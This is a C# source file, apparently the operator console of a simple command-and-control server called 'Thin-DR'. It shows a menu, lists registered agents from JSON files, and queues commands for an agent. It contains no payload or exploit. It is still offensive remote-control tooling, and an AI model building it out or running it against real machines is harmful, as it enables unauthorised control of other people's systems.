using System;
using System.Net;
using System.IO;
using System.Text;
using System.Threading.Tasks;

namespace server{
    public class UserInput{
        //Main class for C2 Operator input
        public Listener listener {get; set;}

        public UserInput(Listener listener){
            //pass our listener into this object
            this.listener = listener;
        }

        private string Menu(){
            //returns a menu
            //should be made generic and with input
            //in the constructor *theoretically*
            Console.Clear();
            Console.WriteLine(@"
_________         _________ _               ______   _______ 
\__   __/|\     /|\__   __/( (    /|       (  __  \ (  ____ )
   ) (   | )   ( |   ) (   |  \  ( |       | (  \  )| (    )|
   | |   | (___) |   | |   |   \ | | _____ | |   ) || (____)|
   | |   |  ___  |   | |   | (\ \) |(_____)| |   | ||     __)
   | |   | (   ) |   | |   | | \   |       | |   ) || (\ (   
   | |   | )   ( |___) (___| )  \  |       | (__/  )| ) \ \__
   )_(   |/     \|\_______/|/    )_)       (______/ |/   \__/
                                                             
            ");
            return "C2 Server User Input\n\t[1] Exit the program\n\t[2] List all Clients";
        }

        public void MenuInput(){
            //User input for the server
            //Menu Backend
            bool menuLoop = true;
            while(menuLoop){
                Console.WriteLine(Menu());
                Console.Write("What would you like to do: ");
                string input = Console.ReadLine();
                switch(input){
                    case "1":
                        //exiting our loop here will terminate the server
                        menuLoop = false;
                        break;
                    case "2":
                        Console.WriteLine("Registered Clients:");
                        ListClients();
                        break;
                    default: 
                        Console.WriteLine("\nInvalid input; Please try again.");
                        break;
                }
            }
        }
        public void ListClients(){
            //lists all the registered clients
            DirectoryInfo dir = new DirectoryInfo(this.listener.agentsPath);
            Console.WriteLine("\n");
            //the json files will eventually be object files
            foreach (var file in dir.GetFiles("*.json")){
                Console.WriteLine(file.Name.Remove(file.Name.Length-5));
            }
        }

        public void SetCommand(Agent agent, string command){
            //set a command for a client to query
            //set the "query buffer" to be json including the hostname and the command
            agent.commandQue.AddLast(command);
        }
    }
}